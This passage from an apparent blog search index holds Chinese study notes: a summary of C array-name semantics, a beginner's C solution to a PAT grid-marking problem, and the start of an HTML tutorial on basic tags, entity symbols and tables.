sizeof内部的表达式不会计算,只看类型</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="总结：数组名的意义"><a href="#总结：数组名的意义" class="headerlink" title="总结：数组名的意义"></a>总结：数组名的意义</h4><ol><li>sizeof(数组名)，这里的数组名表示整个数组，计算的是整个数组的大小</li><li>&amp;数组名，这里的数组名表示整个数组，取出的是整个数组的地址</li><li>除此之外所有的数组名都表示首元素的地址</li></ol><h2 id="PAT-答题卡"><a href="#PAT-答题卡" class="headerlink" title="PAT 答题卡"></a>PAT 答题卡</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Iswhat</span><span class="params">(<span class="type">char</span> a[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(a);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] == <span class="string">&#x27;;&#x27;</span>)&#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[i] == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">            flag = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line"> &#125; </span><br><span class="line"> <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">char</span> s[])</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        s[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n ,m, x, y;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">90</span>][<span class="number">90</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            a[i][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        init(s);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">if</span> (Iswhat(s) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%s &quot;, s);</span></span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, len);</span><br><span class="line">            <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">                x = <span class="number">0</span>;</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>) - <span class="number">1</span>;</span><br><span class="line">                 </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">2</span>) &#123;</span><br><span class="line">                x = <span class="number">0</span>;</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//printf(&quot;%d %d\n&quot;, x, y);</span></span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (Iswhat(s) == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">5</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">5</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[j] == <span class="string">&#x27;;&#x27;</span>) &#123;</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">2</span>) &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">5</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">5</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[j] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">2</span>) &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html学习笔记</title>
      <link href="/2023/03/03/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/03/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一步：安装好要用的编辑器"><a href="#第一步：安装好要用的编辑器" class="headerlink" title="第一步：安装好要用的编辑器"></a>第一步：安装好要用的编辑器</h1><p>我这里用的是Sublime Text</p><p>我自己看的学习视频 <a href="https://www.bilibili.com/video/BV11t411K74Q/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">HTML学习视频</a>。</p><h1 id="第二步：新建HTML文件"><a href="#第二步：新建HTML文件" class="headerlink" title="第二步：新建HTML文件"></a>第二步：新建HTML文件</h1><p><em>在用Sublime Text编写html文件时会自动补全.</em></p><h2 id="我的第一个HTML"><a href="#我的第一个HTML" class="headerlink" title="我的第一个HTML"></a>我的第一个HTML</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、这是HTML的注释</span></span><br><span class="line"><span class="comment">2、支持多行注释</span></span><br><span class="line"><span class="comment">3、不区分大小写，语法松散不严格</span></span><br><span class="line"><span class="comment">4、但最好还是按结构写</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span> <span class="comment">&lt;!--加上这句话就是H5，去掉则是H4.0--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--根--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--头部--&gt;</span>   <span class="comment">&lt;!--注意缩进--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>网页的标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="comment">&lt;!--显示在标签页一栏--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="comment">&lt;!--主体--&gt;</span></span><br><span class="line">网页的主体内容,和老杜学习HTML</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> <span class="comment">&lt;!--大小写无所谓--&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/hhCXWfC8"><img src="https://i.postimg.cc/7Y40zz0R/1.png" alt="1.png"></a></p><h2 id="基本标签"><a href="#基本标签" class="headerlink" title="基本标签"></a>基本标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> <span class="comment">&lt;!--&lt;mata&gt;标签永远位于head元素内部，这里加上</span></span><br><span class="line"><span class="comment">charset属性是为了规定 HTML 文档的字符编码。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--name属性中的viewport表示页面视图的属性下面设置是为了让网页的宽度自动适应，initial-scale:控制页面最初加载时的在在idealviewport下缩放等级，通常设为1，可以是小数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML基本标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--段落标记--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>《三国演义》是罗贯中在有关三国故事的宋元话本、戏曲和轶事传闻的基础上，依据晋代陈寿所著的《三国志》以及南朝宋人裴松之为《三国志》所作的注，所进行的加工再创作。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>该作品成书后有嘉靖壬午本等多个版本传于世，到了明末清初，毛宗岗对《三国演义》整顿回目、修正文辞、改换诗文，该版本也成为诸多版本中水平最高、流传最广的版本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--标题字,是HTML的预留字，和word中的标题字一样--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--最多六个--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--换行--&gt;</span><span class="comment">&lt;!--&lt;br&gt;是独目标记--&gt;</span></span><br><span class="line">hello </span><br><span class="line">world!</span><br><span class="line">hello<span class="tag">&lt;<span class="name">br</span>&gt;</span> world1</span><br><span class="line"></span><br><span class="line">&lt;！--横线(独目)--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--color和width都是hr标签的属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span><span class="comment">&lt;!--单双引号没有要求但一定要写--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--预留格式(否则都在一条直线上)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">for(int i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">printf(&quot;NB&quot;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>删除字<span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>插入字<span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>粗体字<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>斜体字<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--10的平方--&gt;</span></span><br><span class="line">10<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--角标--&gt;</span></span><br><span class="line">10<span class="tag">&lt;<span class="name">sub</span>&gt;</span>m<span class="tag">&lt;/<span class="name">sub</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--字体标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">size</span>=<span class="string">&quot;59&quot;</span>&gt;</span>字体标签<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/14zzHy98"><img src="https://i.postimg.cc/VsqbzNpW/2.png" alt="2.png"></a></p><h2 id="实体符号"><a href="#实体符号" class="headerlink" title="实体符号"></a>实体符号</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>实体符号<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--大于号和小于号可能和标签有冲突--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--b&lt;a&gt;c，而&lt;a&gt;s是链接--&gt;</span></span><br><span class="line">b<span class="symbol">&amp;lt;</span>a<span class="symbol">&amp;gt;</span>c<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--实体符号特点是：以&amp;开始，以;结束。&amp;lt;小于号,&amp;gt;大于号--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--加空格--&gt;</span></span><br><span class="line">avc    def<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">avc<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>def</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/hXRgHnqb"><img src="https://i.postimg.cc/HkVx8WZK/3.png" alt="3.png"></a></p><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>表格<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">borde=&quot;lpx&quot;设置表格的边框为1像素宽度。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--让表格往下走--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表格先行(tr)后列(td)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150px&quot;</span>&gt;</span><span class="comment">&lt;!--百分比设置可缩放--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--第一行--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--align对齐方式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--三列--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第二行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第三行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>x<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>y<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>z<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--单元格合并,以及th标签--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--注意事项</span></span><br><span class="line"><span class="comment">1、row合并的时候，删除下面的单元格</span></span><br><span class="line"><span class="comment">2、col合并的时候,对删除哪一个没有要求</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--也是单元格标签，比&lt;td&gt;多的是居中加粗--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工编号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工薪资<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>部门名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 